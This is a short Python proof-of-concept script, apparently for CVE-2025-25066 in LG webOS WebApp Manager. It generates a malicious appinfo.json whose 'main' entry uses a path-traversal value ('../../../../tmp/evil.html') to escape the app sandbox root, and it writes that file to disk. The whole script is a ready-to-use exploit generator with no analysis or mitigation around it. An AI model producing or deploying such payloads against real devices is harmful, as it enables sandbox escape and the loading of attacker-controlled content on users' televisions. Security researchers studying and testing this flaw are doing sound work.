#!/usr/bin/env python3
"""CVE-2025-25066 — LG webOS WebApp Manager. appinfo.json with a path-traversal
main entry that escapes the app sandbox root."""
import sys
from pathlib import Path

def build() -> bytes:
    return (b'{"id":"org.evil.trav","version":"1.0.0","type":"web",'
            b'"main":"../../../../tmp/evil.html","title":"trav",'
            b'"icon":"icon.png","vendor":"poc"}')

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2025-25066_appinfo.json")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2025-25066 appinfo -> {out}")

if __name__ == "__main__":
    main()
